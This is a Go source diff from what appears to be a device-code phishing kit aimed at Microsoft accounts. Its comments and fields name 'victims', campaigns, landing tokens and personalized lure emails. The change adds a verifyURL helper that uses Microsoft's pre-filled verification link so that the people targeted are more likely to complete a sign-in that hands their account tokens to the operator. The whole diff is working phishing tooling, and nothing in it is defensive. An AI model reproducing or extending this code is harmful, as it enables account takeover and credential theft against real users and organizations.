@@ -35,9 +35,10 @@ type DCTarget struct {
 	CampaignID      int
 	Email           string
 	Tenant          string
-	LandingToken    string // random hex — URL: /dc/<token>
-	UserCode        string // code victim enters at microsoft.com/devicelogin
-	VerificationURI string
+	LandingToken            string // random hex — URL: /dc/<token>
+	UserCode                string // code victim enters at microsoft.com/devicelogin
+	VerificationURI         string
+	VerificationURIComplete string // pre-built URL with code already appended
 	ExpiresIn       int
 	StartedAt       time.Time
 	Status          string // pending | completed | declined | expired | error
@@ -190,13 +191,14 @@ func newTarget(campaignID int, emailOrTenant string) (*DCTarget, error) {
 	body, _ := io.ReadAll(resp.Body)
 
 	var dc struct {
-		DeviceCode      string `json:"device_code"`
-		UserCode        string `json:"user_code"`
-		VerificationURI string `json:"verification_uri"`
-		ExpiresIn       int    `json:"expires_in"`
-		Interval        int    `json:"interval"`
-		Error           string `json:"error"`
-		ErrorDesc       string `json:"error_description"`
+		DeviceCode              string `json:"device_code"`
+		UserCode                string `json:"user_code"`
+		VerificationURI         string `json:"verification_uri"`
+		VerificationURIComplete string `json:"verification_uri_complete"`
+		ExpiresIn               int    `json:"expires_in"`
+		Interval                int    `json:"interval"`
+		Error                   string `json:"error"`
+		ErrorDesc               string `json:"error_description"`
 	}
 	if err := json.Unmarshal(body, &dc); err != nil {
 		return nil, fmt.Errorf("bad response: %v", err)
@@ -219,9 +221,10 @@ func newTarget(campaignID int, emailOrTenant string) (*DCTarget, error) {
 		Email:           email,
 		Tenant:          tenant,
 		LandingToken:    token,
-		deviceCode:      dc.DeviceCode,
-		UserCode:        dc.UserCode,
-		VerificationURI: dc.VerificationURI,
+		deviceCode:              dc.DeviceCode,
+		UserCode:                dc.UserCode,
+		VerificationURI:         dc.VerificationURI,
+		VerificationURIComplete: dc.VerificationURIComplete,
 		ExpiresIn:       dc.ExpiresIn,
 		StartedAt:       time.Now(),
 		Status:          "pending",
@@ -478,7 +481,7 @@ func personalizeText(text, email string) string {
 }
 
 func personalizeForTarget(text string, t *DCTarget) string {
-	verifyLink := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
+	verifyLink := t.verifyURL()
 	landingURL := ""
 	if GlobalDCCfg != nil {
 		if h := GlobalDCCfg.GetDCLandingHost(); h != "" {
@@ -501,7 +504,7 @@ func personalizeForTarget(text string, t *DCTarget) string {
 // If letter.html exists in the working directory it is used as the template
 // (same convention as the Node sender). Otherwise falls back to built-in templates.
 func buildEmailContent(t *DCTarget, tmpl string) (subject, body string) {
-	verifyLink := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
+	verifyLink := t.verifyURL()
 	landingURL := ""
 	if GlobalDCCfg != nil {
 		if h := GlobalDCCfg.GetDCLandingHost(); h != "" {
@@ -603,6 +606,16 @@ func dcRandStr(n int, charset string) string {
 
 func dcB64(s string) string {
 	return base64.URLEncoding.EncodeToString([]byte(s))
+}
+
+// verifyURL returns the best URL to send the victim to. Uses Microsoft's own
+// verification_uri_complete when available (they build it correctly), otherwise
+// falls back to constructing it from verification_uri + user_code.
+func (t *DCTarget) verifyURL() string {
+	if t.VerificationURIComplete != "" {
+		return t.VerificationURIComplete
+	}
+	return t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
